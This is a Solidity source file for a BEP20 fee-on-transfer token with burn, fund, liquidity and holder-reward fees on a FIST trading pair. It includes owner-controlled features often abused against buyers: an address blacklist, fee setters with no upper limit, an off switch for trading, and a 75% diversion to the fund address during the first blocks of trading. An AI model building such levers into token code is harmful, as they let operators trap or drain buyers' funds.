// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

import "./IERC20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";
import "./ISwapRouter.sol";
import "./ISwapFactory.sol";
import "./TokenDistributor.sol";

abstract contract ImpToken is IERC20, Ownable {

    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;
    mapping(address => bool) public _swapPairList;

    address public fundAddress;
    address public devAddress;
    address public _fist;
    address public _mainPair;
    address public DEAD = address(0x000000000000000000000000000000000000dEaD);
    address public ZERO = address(0);

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    TokenDistributor public _tokenDistributor;

    bool private inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = false;
    bool public liquifyEnabled = false;

    uint256 public _buyBurnFee = 100;
    uint256 public _sellBurnFee = 100;
    uint256 public _buyFundFee = 100;
    uint256 public _sellFundFee = 100;
    uint256 public _buyLPDividendFee = 100;
    uint256 public _sellLPDividendFee = 100;
    uint256 public _buyLPFee = 100;
    uint256 public _sellLPFee = 100;
    uint256 private constant MAX = ~uint256(0);
    uint256 private numTokensSellToAddToLiquidity;

    uint256 public startTradeBlock;
    uint256 public startAddLPBlock;
    uint256 private holderRewardCondition;

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;
    uint256 private currentIndex;
    uint256 private progressRewardBlock;

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SetSwapPairList(address indexed addr, bool indexed enable);
    event SwapAddERC20Liquify(
        uint256 tokensSwapped,
        uint256 erc20Received,
        uint256 tokensIntoLiqudity
    );

    constructor (
        address RouterAddress, address FISTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply, uint256 minNum,
        address FundAddress, address ReceiveAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        numTokensSellToAddToLiquidity = minNum * 10 ** uint256(_decimals);

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(FISTAddress).approve(address(swapRouter), MAX);

        _fist = FISTAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), FISTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;
        devAddress = msg.sender;

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[devAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;

        holderRewardCondition = 1 * 10 ** IERC20(FISTAddress).decimals();

        _tokenDistributor = new TokenDistributor(FISTAddress);
    }

    receive() external payable {}

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        bool takeFee;
        bool isSell;

        require(from != address(0), "BEP20: transfer from the zero address");
        require(to != address(0), "BEP20: transfer to the zero address");
        require(!_blackList[from] && !_blackList[to], "BEP20: sender or recipient in blackList");

        uint256 fromBalance = balanceOf(from);
        require(fromBalance >= amount, "BEP20: transfer amount exceeds balance");

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = fromBalance.mul(9999).div(10000);
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && _swapPairList[to], "BEP20:operater action is not AddLiquidity");
                }
                if (block.number < startTradeBlock.add(4)) {
                    _funTransfer(from, to, amount);
                    return;
                }

                uint256 swapFee = _buyFundFee.add(_sellFundFee).add(_buyLPDividendFee).add(_sellLPDividendFee).add(_buyLPFee).add(_sellLPFee);

                // also, don't swap & liquify if sender is uniswap pair.
                uint256 contractTokenBalance = balanceOf(address(this));
                bool overMinTokenBalance = contractTokenBalance >= numTokensSellToAddToLiquidity;
                if (
                    overMinTokenBalance &&
                    !inSwapAndLiquify &&
                    _swapPairList[to] &&
                    swapAndLiquifyEnabled
                ) {
                    contractTokenBalance = numTokensSellToAddToLiquidity;
                    //add liquidity
                    swapAndERC20Liquify(contractTokenBalance, swapFee);
                }

                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }
        
        _tokenTransfer(from, to, amount, takeFee, isSell);

        if (from != address(this)) {
            if (isSell) {
                addHolder(from);
            }
            processReward(500000);
        }
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender].sub(tAmount);
        uint256 feeAmount = tAmount.mul(75).div(100);
        _takeTransfer(
            sender,
            fundAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount.sub(feeAmount));
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        
        uint256 feeAmount;

        _balances[sender] = _balances[sender].sub(tAmount);

        if (takeFee) {
            uint256 swapFee;
            uint256 burnAmount;
            uint256 burnTotal = balanceOf(DEAD);
            if (isSell) {
                swapFee = _sellFundFee.add(_sellLPDividendFee).add(_sellLPFee);
                burnAmount = tAmount.mul(_sellBurnFee).div(10000);
            } else {
                swapFee = _buyFundFee.add(_buyLPDividendFee).add(_buyLPFee);
                burnAmount = tAmount.mul(_buyBurnFee).div(10000);
            }
            uint256 swapAmount = tAmount.mul(swapFee).div(10000);
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
            if(
                burnAmount > 0 &&
                burnTotal <= _tTotal.mul(9000).div(10000)
            ) {
                feeAmount += burnAmount;
                _takeTransfer(sender, DEAD, burnAmount);
            }
        }

        _takeTransfer(sender, recipient, tAmount.sub(feeAmount));
    }

    function swapAndERC20Liquify(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        
        uint256 lpFee = _sellLPFee.add(_buyLPFee);
        uint256 lpAmount = tokenAmount.mul(lpFee).div(swapFee);
        uint256 halflpAmount = lpAmount.div(2);
        uint256 otherlpAmount = lpAmount.sub(halflpAmount);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _fist;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount.sub(otherlpAmount),
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );
        
        swapFee = swapFee.sub(lpFee.div(2));

        IERC20 FIST = IERC20(_fist);
        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = fistBalance.mul(_buyFundFee.add(_sellFundFee)).div(swapFee);
        if(fundAmount > 0) {
            FIST.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
        }
        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance.sub(fundAmount));

        if(
            liquifyEnabled &&
            lpAmount > 0
        ) {
            uint256 lpFist = fistBalance.mul(lpFee).div(swapFee).div(2);
            _swapRouter.addLiquidity(
                    address(this), _fist, otherlpAmount, lpFist, 0, 0, fundAddress, block.timestamp
                );
            emit SwapAddERC20Liquify(halflpAmount, lpFist, otherlpAmount);
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to].add(tAmount);
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyFunder {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setDevAddress(address addr) external onlyFunder {
        devAddress = addr;
    }

    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {
        _buyLPDividendFee = dividendFee;
    }

    function setBuyFundFee(uint256 fundFee) external onlyOwner {
        _buyFundFee = fundFee;
    }

    function setBuyLPFee(uint256 lpFee) external onlyOwner {
        _buyLPFee = lpFee;
    }

    function setBuyBurnFee(uint256 burnFee) external onlyOwner {
        _buyBurnFee = burnFee;
    }

    function setSellLPDividendFee(uint256 dividendFee) external onlyOwner {
        _sellLPDividendFee = dividendFee;
    }

    function setSellFundFee(uint256 fundFee) external onlyOwner {
        _sellFundFee = fundFee;
    }

    function setSellLPFee(uint256 lpFee) external onlyOwner {
        _sellLPFee = lpFee;
    }

    function setSellBurnFee(uint256 burnFee) external onlyOwner {
        _sellBurnFee = burnFee;
    }

    function startAddLP() external onlyOwner {
        require(0 == startAddLPBlock, "BEP20: startAddLP has been set");
        startAddLPBlock = block.number;
    }

    function closeAddLP() external onlyOwner {
        require(startAddLPBlock > 0, "BEP20: startAddLP has not been set");
        startAddLPBlock = 0;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "BEP20: startTrade has been set");
        startTradeBlock = block.number;
    }

    function closeTrade() external onlyOwner {
        require(startTradeBlock > 0, "BEP20: startTrade has not been set");
        startTradeBlock = 0;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyFunder {
        _feeWhiteList[addr] = enable;
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyFunder {
        require(_swapPairList[addr] != enable, "BEP20: swapPairList is already set to that enable");
        _swapPairList[addr] = enable;
        emit SetSwapPairList(addr, enable);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyFunder {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setLiquifyEnabled(bool _enabled) public onlyFunder {
        liquifyEnabled = _enabled;
    }

    function setProgressRewardBlock(uint256 _progressRewardBlock) public onlyFunder {
        require(_progressRewardBlock >= progressRewardBlock, "BEP20: progressRewardBlock less than current value");
        progressRewardBlock = _progressRewardBlock;
    }

    function claimBalance() external onlyFunder {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external onlyFunder {
        IERC20(token).transfer(to, amount);
    }

    modifier onlyFunder() {
        require(owner() == msg.sender || fundAddress == msg.sender || devAddress == msg.sender, "BEP20: caller is not owner or Funder and Dev");
        _;
    }

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    function processReward(uint256 gas) private {
        if (progressRewardBlock + 1 days > block.timestamp) {
            return;
        }

        IERC20 FIST = IERC20(_fist);

        uint256 balance = FIST.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance.mul(tokenBalance).div(holdTokenTotal);
                if (amount > 0) {
                    FIST.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.timestamp;
    }

    function setHolderRewardCondition(uint256 amount) external onlyFunder {
        holderRewardCondition = amount;
    }

    function setNumTokensSellToAddToLiquidity(uint256 amount) external onlyFunder {
        numTokensSellToAddToLiquidity = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyFunder {
        excludeHolder[addr] = enable;
    }
}